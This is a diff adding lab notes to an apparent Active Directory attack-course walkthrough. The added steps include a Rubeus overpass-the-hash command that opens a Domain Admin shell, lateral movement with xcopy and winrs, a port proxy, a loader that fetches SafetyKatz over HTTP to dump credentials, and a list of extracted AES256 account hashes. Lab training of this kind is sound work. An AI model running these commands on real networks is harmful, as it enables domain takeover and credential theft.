@@ -144,6 +144,51 @@ Session completed
 
 ***
 
+## OverPass-the-Hash — Spawn process as DA
+
+Once you have the AES256 hash of svcadmin (from Kerberoasting + cracking), spawn a new cmd running as Domain Admin:
+
+> Run from an elevated cmd (Run as administrator) on the student VM
+
+```
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+> New cmd window opens running as svcadmin (DA). All subsequent DA commands run from that window.
+
+```
+set username
+## svcadmin
+```
+
+***
+
+## Dump credentials from dcorp-adminsrv
+
+We have local admin on dcorp-adminsrv. Copy Loader and extract all credentials via SafetyKatz:
+
+> From the DA cmd obtained above
+
+```
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-adminsrv\C$\Users\Public\Loader.exe /Y
+winrs -r:dcorp-adminsrv cmd
+```
+
+Set up port forward in the winrs session, then dump creds:
+
+```
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.X
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "sekurlsa::evasive-keys" "exit"
+```
+
+> Key accounts extracted — keep these, needed for Delegation attacks later:
+>
+> * **appadmin** — aes256: `68f08715061e4d0790e71b1245bf20b023d08822d2df85bff50a0e8136ffe4cb`
+> * **websvc** — aes256: `2d84a12f614ccbf3d716b8339cbbe1a650e5fb352edc8e879470ade07e5412d7`
+> * **dcorp-adminsrv$** — aes256: `e9513a0ac270264bb12fb3b3ff37d7244877d269a97c7b3ebc3f6f78c382eb51`
+
+***
+
 ## Abuse Jenkins Instance
 
 > Note: Remember to use Edge to open the Jenkins web console!
